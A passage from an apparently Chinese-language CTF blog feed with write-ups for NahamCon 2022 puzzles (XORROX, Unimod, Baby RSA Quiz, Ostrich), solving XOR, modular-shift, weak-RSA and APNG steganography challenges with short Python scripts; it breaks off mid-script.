class="hljs-symbol">\u007d</span><br></code></pre></td></tr></table></figure><p>最后得到这个。这里面最后还有几个字符不知道。看看能不能再找出几个替代。</p><p>对于当前的十六进制我们已经有了[0,3,4,5,7,9,b,d],那么还剩下[1,2,6,8,a,c,e,f]。</p><p>对于\u00✲b</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">\u002b: +<br>\u006b: <span class="hljs-type">k</span><br></code></pre></td></tr></table></figure><p>所以应该是6。</p><p>对于\u007✡，可选的只有[1,2,8,a,c,e,f]</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\u0071</span>:q<br><span class="hljs-string">\u0072</span>:r<br><span class="hljs-string">\u0078</span>:x<br><span class="hljs-string">\u007a</span>:z<br><span class="hljs-string">\u007c</span>:|<br><span class="hljs-string">\u007e</span>:~<br><span class="hljs-string">\u007f</span>:不可见<br></code></pre></td></tr></table></figure><p>c,e,f被排除。当前可选1，2，8，a</p><p>对于\u003✸，可选[1,2,8,a,c,e,f]</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\u0031</span>:<span class="hljs-number">1</span><br><span class="hljs-string">\u0032</span>:<span class="hljs-number">2</span><br><span class="hljs-string">\u0038</span>:<span class="hljs-number">8</span><br><span class="hljs-string">\u003a</span>::<br><span class="hljs-string">\u003c</span>:&lt;<br><span class="hljs-string">\u003e</span>:&gt;<br><span class="hljs-string">\u003f</span>:?<br></code></pre></td></tr></table></figure><p>可选1，2，8</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NahamCon2022</title>
    <link href="/2022/05/01/NahamCon2022/"/>
    <url>/2022/05/01/NahamCon2022/</url>
    
    <content type="html"><![CDATA[<p>NahamCon CTF 2022 中 XORROX、Unimod、Baby RSA Quiz 和 Ostrich 的题解。</p><span id="more"></span><p>今天玩了玩NahamCon CTF 2022，凌晨三点开始比赛。当然，我肯定是睡觉起床了再打。</p><p>起床之后队友把热身题全扫了，我也没啥题可以做了（菜鸡一个。后面找了以下难度不大的crypto写。以下是writeup。后面我还会写一下别人的writeup，因为有些题没写出来。</p><h1 id="xorrox"><a class="markdownIt-Anchor" href="#xorrox"></a> XORROX</h1><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    flag = filp.read().strip()<br><br>key = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]<br><br>xorrox = []<br>enc = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br>    enc.append(flag[i] ^ v)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;xorrox=&#125;</span>\n&quot;</span>)<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;enc=&#125;</span>\n&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>可以看到是一个简单的多次异或。异或是可逆的，而且我们的key元素中的第一个也就是key[0]是不会被修改的。所以我们只需要再跑一下这个循环，把key跑出来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>xorrox=[<span class="hljs-number">1</span>, <span class="hljs-number">209</span>, <span class="hljs-number">108</span>, <span class="hljs-number">239</span>, <span class="hljs-number">4</span>, <span class="hljs-number">55</span>, <span class="hljs-number">34</span>, <span class="hljs-number">174</span>, <span class="hljs-number">79</span>, <span class="hljs-number">117</span>, <span class="hljs-number">8</span>, <span class="hljs-number">222</span>, <span class="hljs-number">123</span>, <span class="hljs-number">99</span>, <span class="hljs-number">184</span>, <span class="hljs-number">202</span>, <span class="hljs-number">95</span>, <span class="hljs-number">255</span>, <span class="hljs-number">175</span>, <span class="hljs-number">138</span>, <span class="hljs-number">150</span>, <span class="hljs-number">28</span>, <span class="hljs-number">183</span>, <span class="hljs-number">6</span>, <span class="hljs-number">168</span>, <span class="hljs-number">43</span>, <span class="hljs-number">205</span>, <span class="hljs-number">105</span>, <span class="hljs-number">92</span>, <span class="hljs-number">250</span>, <span class="hljs-number">28</span>, <span class="hljs-number">80</span>, <span class="hljs-number">31</span>, <span class="hljs-number">201</span>, <span class="hljs-number">46</span>, <span class="hljs-number">20</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>]<br>enc=[<span class="hljs-number">26</span>, <span class="hljs-number">188</span>, <span class="hljs-number">220</span>, <span class="hljs-number">228</span>, <span class="hljs-number">144</span>, <span class="hljs-number">1</span>, <span class="hljs-number">36</span>, <span class="hljs-number">185</span>, <span class="hljs-number">214</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">178</span>, <span class="hljs-number">145</span>, <span class="hljs-number">47</span>, <span class="hljs-number">237</span>, <span class="hljs-number">70</span>, <span class="hljs-number">244</span>, <span class="hljs-number">149</span>, <span class="hljs-number">98</span>, <span class="hljs-number">20</span>, <span class="hljs-number">46</span>, <span class="hljs-number">187</span>, <span class="hljs-number">207</span>, <span class="hljs-number">136</span>, <span class="hljs-number">154</span>, <span class="hljs-number">231</span>, <span class="hljs-number">131</span>, <span class="hljs-number">193</span>, <span class="hljs-number">84</span>, <span class="hljs-number">148</span>, <span class="hljs-number">212</span>, <span class="hljs-number">126</span>, <span class="hljs-number">126</span>, <span class="hljs-number">226</span>, <span class="hljs-number">211</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">119</span>]<br>key = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(xorrox):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= xorrox[j]<br>    xorrox[i] = k<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]^k), end=<span class="hljs-string">&quot;&quot;</span>)<br>    key.append(k)<br><span class="hljs-built_in">print</span>(key, <span class="hljs-built_in">len</span>(key))<br><br>    <br>xorrox = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br><span class="hljs-built_in">print</span>(xorrox)<br></code></pre></td></tr></table></figure><h1 id="unimod"><a class="markdownIt-Anchor" href="#unimod"></a> Unimod</h1><p>这题有点蛋疼。因为直接看数据文件格式有点不对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>ct = <span class="hljs-string">&#x27;&#x27;</span><br>k = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">0xFFFD</span>)<br><span class="hljs-comment"># k = 15449</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag:<br>    <br>    ct += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(c) + k) % <span class="hljs-number">0xFFFD</span>)<br>    <br>    <span class="hljs-comment"># a = chr((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print((ord(c) + k) % 0xFFFD)</span><br>    <span class="hljs-comment"># print(libnum.s2n(chr((ord(c) + k) % 0xFFFD)))</span><br>    <span class="hljs-comment"># print(ord(a))</span><br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(ct.encode())<br><br></code></pre></td></tr></table></figure><p>注释部分是我测试的部分。原题目是没有的。</p><p>以下是原题目的十六进制数据。可以看到很明显的三个字节一个分组。但是从代码上看，我们的到的数据应该是两个字节一个分组。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E9</span> A5 <span class="hljs-number">87</span> E9 A5 <span class="hljs-number">8</span>D E9 A5 <span class="hljs-number">82</span> E9 A5 <span class="hljs-number">88</span> E9 A5 <span class="hljs-number">9</span>C E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">99</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">97</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">97</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">83</span> E9 A5 <span class="hljs-number">84</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">86</span> E9 A5 <span class="hljs-number">82</span> E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">93</span> E9 A5 <span class="hljs-number">85</span> E9 A4 <span class="hljs-number">96</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">9</span>A E9 A4 <span class="hljs-number">98</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">94</span> E9 A4 <span class="hljs-number">95</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">86</span> E9 A4 <span class="hljs-number">99</span> E9 A4 <span class="hljs-number">95</span> E9 A5 <span class="hljs-number">87</span> E9 A4 <span class="hljs-number">92</span> E9 A4 <span class="hljs-number">92</span> E9 A5 <span class="hljs-number">9</span>E E9 A3 AB<br></code></pre></td></tr></table></figure><p>所以有了注释中的三条输出语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">15565<br>14922637<br>15565<br></code></pre></td></tr></table></figure><p>可以看到，这个数据经过编码成了三个字节。所以我们直接读文件，然后用三个字节分组，使用<strong>ord</strong>函数来解码，才能得到正确的值。</p><p>这里其实有个k，但是影响不大。这里0xFFFD其实比我们ASCII码的范围大了太多。基本上不会出现取的k刚好在0xFFFD的边界上。所以直接解就行了，如果不行那也就再加个0xFFFD进行处理就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;out&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br><span class="hljs-comment"># 反正挺坑的，一个2字节的数据二进制写入成了3字节，这里直接三字节分片然后用ord取他的数字就行</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">3</span>):<br>    a = data[i:i+<span class="hljs-number">3</span>].decode()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) - <span class="hljs-number">39137</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># 通过猜测第一个字符是&#x27;f&#x27;， 来计算k = 39137</span><br></code></pre></td></tr></table></figure><h1 id="baby-rsa-quiz"><a class="markdownIt-Anchor" href="#baby-rsa-quiz"></a> Baby RSA Quiz</h1><p>这题没有给文件而是以ssh的方式进行的。</p><p>一共三小题，第一小题给的是个小n，直接分解就行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 1: |<br> ---------<br>n = 115398298544369<br>e = 65537<br>ct = 37386859625793<br><br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这个直接上网站一分解就行。得到p，q求解d，然后算m。这里答案是整型的，但其实也是能转成字符串的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 2: |<br> ---------<br> n = 21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419<br> e = 3<br> ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125<br> What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这里可以看到加密指数e很小，所以我们只需要开方求解就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">0x3</span><br>n = <span class="hljs-number">21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419</span><br>c = <span class="hljs-number">26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125</span><br><br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    res = iroot(c + k * n, e)  <span class="hljs-comment"># c+k*n 开3次方根 能开3次方即可</span><br>    <span class="hljs-keyword">if</span> (res[<span class="hljs-number">1</span>] == <span class="hljs-literal">True</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])))  <span class="hljs-comment"># 转为字符串</span><br>        <span class="hljs-keyword">break</span><br>    k = k + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>这里我打印了数字也打印了字符串，是从我之前的代码上改的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 3: |<br> ---------<br> q = p + 2<br>while !(isPrime(q)):<br>    q += 2<br>n = p*q<br>n = 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>e = 65537<br>ct = 20631059905657990621121472678172311137355898932087354262172309893885321498925560019065033573185005618575156342764326342253251212781095718707971251014407982342185739678572043698218123534431914415817339019215948120246829763194761668345794978860628612447418680047622373133912651452245133307912003452486642093319<br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这里给出了两个素数生成的方法。可以看到这两个素数应该是比较接近的。</p><p>所以直接用yafu尝试进行分解。yafu比较适合这种情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">fac: factoring 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>fac: using pretesting plan: normal<br>fac: no tune info: using qs/gnfs crossover of 95 digits<br>div: primes less than 10000<br>fmt: 1000000 iterations<br>Total factoring time = 0.6750 seconds<br><br><br>***factors found***<br><br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588379<br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588327<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>可以看到很快就出答案了。这样p和q就分解出来了。后面就是单纯的rsa运算了。</p><p>后面还做了一道隐写</p><h1 id="ostrich"><a class="markdownIt-Anchor" href="#ostrich"></a> Ostrich</h1><p>一共给了三个文件。</p><p>一张图片，一个算法，一个结果。</p><p>应该对算法进行逆向就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> imageio<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>filenames = []<br>flag = <span class="hljs-string">&quot;REDACTED&quot;</span> <br><br>orig_filename = <span class="hljs-string">&quot;ostrich.jpg&quot;</span><br>orig_image = Image.<span class="hljs-built_in">open</span>(orig_filename)<br>pixels = orig_image.load()<br>width, height = orig_image.size<br>images = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    new_filename = <span class="hljs-string">f&#x27;./images/ostrich<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    new_image = Image.new(orig_image.mode, orig_image.size)<br>    new_pixels = new_image.load()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            new_pixels[x,y] = orig_image.getpixel((x, y))<br><br>    x = random.randrange(<span class="hljs-number">0</span>,width)<br>    y = random.randrange(<span class="hljs-number">0</span>,height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br>    <span class="hljs-keyword">while</span>(pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>        x = random.randrange(<span class="hljs-number">0</span>,width)<br>        y = random.randrange(<span class="hljs-number">0</span>,height)<br>        pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>,width), random.randrange(<span class="hljs-number">0</span>,height))))<br>    <br>    new_val = l2b(pixel[<span class="hljs-number">2</span>]*<span class="hljs-built_in">ord</span>(flag[i]))<br>    pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>        pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br>    pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br><br>    new_pixels[x, y] = (pixel[<span class="hljs-number">0</span>], pixel[<span class="hljs-number">1</span>], pixel[<span class="hljs-number">2</span>])<br>    new_image.save(new_filename)<br>    filenames.append(new_filename)<br>    images.append(new_image)<br><br>APNG.from_files(filenames, delay=<span class="hljs-number">0</span>).save(<span class="hljs-string">&quot;result.apng&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>最后保存的是一个APNG文件，这是个动图文件，但这里不会动就是了。</p><p>大致流程先看了一遍。我们先把文件提出来，这里的APNG动图也是多幅图片在一起构成的。每张图片里面嵌入了一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>img = APNG.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;result.apng&quot;</span>)<br><br><span class="hljs-keyword">for</span> i, (png, control) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(img.frames):<br>    png.save(<span class="hljs-string">&quot;./extract/&#123;i&#125;.png&quot;</span>.<span class="hljs-built_in">format</span>(i=i))<br></code></pre></td></tr></table></figure><p>一共提取了38张图片。</p><p>来讲一下嵌入的流程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">x = random.randrange(<span class="hljs-number">0</span>, width)<br>y = random.randrange(<span class="hljs-number">0</span>, height)<br>pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br><span class="hljs-keyword">while</span> (pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>    x = random.randrange(<span class="hljs-number">0</span>, width)<br>    y = random.randrange(<span class="hljs-number">0</span>, height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>, width), random.randrange(<span class="hljs-number">0</span>, height))))<br></code></pre></td></tr></table></figure><p>最主要的部分在这里。</p><p>这里要找一个B通道值不为0的点。原始图像中找一个B通道不为0的点，基本上所有的点都不可能B通道为0，所以其实就是随机的在里面找一个点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">new_val = l2b(pixel[<span class="hljs-number">2</span>] * <span class="hljs-built_in">ord</span>(flag[i]))<br> pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>     pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br> pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>在这里面，又把我们的值改成了0。这就让这个点很好找了。。</p><p>所以我们只需要找到这个点，读取这个点的像素值，然后和原始图像的这个点做运算就可以得到flag。</p><p>只要和原图比较多了哪一个b通道值为0 的点就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><br>origin = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;ostrich.jpg&quot;</span>)<br>zero_dot = []<br>width, height = origin.size<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span 